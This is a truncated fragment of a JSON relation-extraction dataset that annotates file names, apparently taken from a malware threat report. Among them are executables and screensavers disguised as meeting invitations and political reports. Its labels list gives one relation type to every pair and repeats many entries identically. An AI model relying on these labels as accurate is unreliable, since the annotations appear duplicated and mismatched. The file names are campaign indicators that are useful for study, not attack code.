[{"name": "Human right report of noth Afica under the war.scr", "pos": [1, 10], "sent_id": 204, "type": "File"}], [{"name": "Middle_East_Civil_Unrest.pdf", "pos": [10, 11], "sent_id": 204, "type": "File"}], [{"name": "Protests Spread in Syria.pdf", "pos": [11, 15], "sent_id": 204, "type": "File"}], [{"name": "Cybersecurity and Cyber War.pdf", "pos": [15, 19], "sent_id": 204, "type": "File"}], [{"name": "The Meeting intivation of International Atomic Energy Agency 06-05-2011.scr", "pos": [0, 9], "sent_id": 205, "type": "File"}], [{"name": "meeting invitation of British Council 2011.scr", "pos": [9, 15], "sent_id": 205, "type": "File"}], [{"name": "Meeting information details of [REMOVED].exe", "pos": [0, 6], "sent_id": 206, "type": "File"}], [{"name": "Meeting information details of [REMOVED].exe", "pos": [0, 6], "sent_id": 206, "type": "File"}], [{"name": "Meeting detail information from [REMOVED].scr", "pos": [6, 12], "sent_id": 207, "type": "File"}], [{"name": "Meeting detail information from [REMOVED].scr", "pos": [6, 12], "sent_id": 207, "type": "File"}], [{"name": "FY12 Government Opportunities.pdf", "pos": [18, 21], "sent_id": 207, "type": "File"}], [{"name": "China's Jasmine protests.pdf", "pos": [0, 4], "sent_id": 208, "type": "File"}], [{"name": "Yemen para for SC briefing.doc", "pos": [4, 9], "sent_id": 208, "type": "File"}], [{"name": "DECLARATION- COMMENTS.Netherlands.pdf", "pos": [9, 11], "sent_id": 208, "type": "File"}], [{"name": "weekly_security_report-06-20-2011__-__06-26-2011.pdf", "pos": [11, 12], "sent_id": 208, "type": "File"}], [{"name": "2011.xls", "pos": [12, 13], "sent_id": 208, "type": "File"}], [{"name": "Obituary.xls", "pos": [13, 14], "sent_id": 208, "type": "File"}], [{"name": "Updated_roster.xls", "pos": [14, 15], "sent_id": 208, "type": "File"}], [{"name": "2011 project budget.xls", "pos": [15, 18], "sent_id": 208, "type": "File"}], [{"name": "Participant_Contacts.xls", "pos": [18, 19], "sent_id": 208, "type": "File"}], [{"name": "Current international situation surrounding Syria.doc", "pos": [0, 5], "sent_id": 209, "type": "File"}], [{"name": "Update of Health & Medical force.xls", "pos": [0, 6], "sent_id": 210, "type": "File"}], [{"name": "How to Get Free Airline Tickets.pdf", "pos": [6, 12], "sent_id": 210, "type": "File"}], [{"name": "REPLY_ FORM.doc", "pos": [12, 15], "sent_id": 210, "type": "File"}], [{"name": "Global A&D outlook 2012.pdf", "pos": [0, 4], "sent_id": 211, "type": "File"}], [{"name": "Global_A&D_outlook_2012.pdf", "pos": [4, 5], "sent_id": 211, "type": "File"}]], "labels": [{"r": "P21", "h": 1, "t": 0, "evidence": [2, 11]}, {"r": "P21", "h": 2, "t": 0, "evidence": [2, 12]}, {"r": "P21", "h": 3, "t": 0, "evidence": [2, 12]}, {"r": "P21", "h": 4, "t": 0, "evidence": [2, 12]}, {"r": "P21", "h": 5, "t": 0, "evidence": [2, 12]}, {"r": "P21", "h": 6, "t": 0, "evidence": [2, 12]}, {"r": "P21", "h": 7, "t": 0, "evidence": [2, 12]}, {"r": "P21", "h": 8, "t": 0, "evidence": [2, 12]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 57, "t": 0, "evidence": [2, 23]}, {"r": "P21", "h": 58, "t": 0, "evidence": [2, 24]}, {"r": "P21", "h": 59, "t": 0, "evidence": [2, 24]}, {"r": "P21", "h": 60, "t": 0, "evidence": [2, 25]}, {"r": "P21", "h": 61, "t": 0, "evidence": [2, 25]}, {"r": "P21", "h": 62, "t": 0, "evidence": [2, 26]}, {"r": "P21", "h": 63, "t": 0, "evidence": [2, 26]}, {"r": "P21", "h": 64, "t": 0, "evidence": [2, 26]}, {"r": "P21", "h": 65, "t": 0, "evidence": [2, 26]}, {"r": "P21", "h": 66, "t": 0, "evidence": [2, 26]}, {"r": "P21", "h": 67, "t": 0, "evidence": [2, 26]}, {"r": "P21", "h": 505, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 506, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 507, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 508, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 509, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 510, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 511, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 512, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 513, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 514, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 515, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 516, "t": 0, "evidence": [2, 180]}, {"r": "P21", "h": 482, "t": 0, "evidence": [2, 175]}, {"r": "P21", "h": 483, "t": 0, "evidence": [2, 175]}, {"r": "P21", "h": 484, "t": 0, "evidence": [2, 175]}, {"r": "P21", "h": 485, "t": 0, "evidence": [2, 175]}, {"r": "P21", "h": 486, "t": 0, "evidence": [2, 175]}, {"r": "P21", "h": 487, "t": 0, "evidence": [2, 175]}, {"r": "P21", "h": 488, "t": 0, "evidence": [2, 175]}, {"r": "P21", "h": 489, "t": 0, "evidence": [2, 175]}, {"r": "P21", "h": 490, "t": 0, "evidence": [2, 175]}, {"r": "P21", "h": 491, "t": 0, "evidence": [2, 176]}, {"r": "P21", "h": 492, "t": 0, "evidence": [2, 176]}, {"r": "P21", "h": 493, "t": 0, "evidence": [2, 176]}, {"r": "P21", "h": 494, "t": 0, "evidence": [2, 177]}, {"r": "P21", "h": 495, "t": 0, "evidence": [2, 177]}, {"r": "P21", "h": 496, "t": 0, "evidence": [2, 177]}, {"r": "P21", "h": 497, "t": 0, "evidence": [2, 177]}, {"r": "P21", "h": 498, "t": 0, "evidence": [2, 177]}, {"r": "P21", "h": 499, "t": 0, "evidence": [2, 177]}, {"r": "P21", "h": 500, "t": 0, "evidence": [2, 177]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 9, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 10, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 11, "t": 0, "evidence": [2, 13]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 12, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 13, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 14, "t": 0, "evidence": [2, 14]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 15, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 16, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 17, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 19, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 20, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 21, "t": 0, "evidence": [2, 15]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 22, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 23, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 24, "t": 0, "evidence": [2, 16]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 25, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 27, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 17]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 29, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 31, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 33, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 35, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 37, "t": 0, "evidence": [2, 18]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 39, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, 